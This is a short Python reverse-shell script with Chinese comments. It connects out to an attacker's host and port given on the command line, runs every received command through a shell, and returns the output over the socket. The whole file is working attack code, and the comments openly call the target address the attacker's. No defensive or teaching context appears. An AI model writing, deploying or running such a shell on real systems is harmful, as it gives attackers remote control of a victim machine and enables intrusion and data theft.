#!/usr/bin/python
#coding:utf-8
 
import socket,subprocess as sp,sys                    # 导入subprocess，socket模块
 
# 1）连接信息
host = sys.argv[1]                                   # 攻击者地址，通常留空''
port = int(sys.argv[2])                              # 攻击者主机端口
 
# 2）套接字部分
conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字
conn.connect((host,port))
 
while 1:
    command = str(conn.recv(1024))
 
    if command != "exit()":
        sh = sp.Popen(command,shell=True,
                      stdout=sp.PIPE,
                      stderr=sp.PIPE,
                      stdin=sp.PIPE)
 
        out,err = sh.communicate()   # 与进程交互：将数据发送到标准输入。从标准输出和标准错误读取数据，直至到达文件末尾。
 
        result = str(out) + str(err)
 
        length = str(len(result)).zfill(16)
 
        conn.send(length + result)
    else:
        break
 
 
conn.close()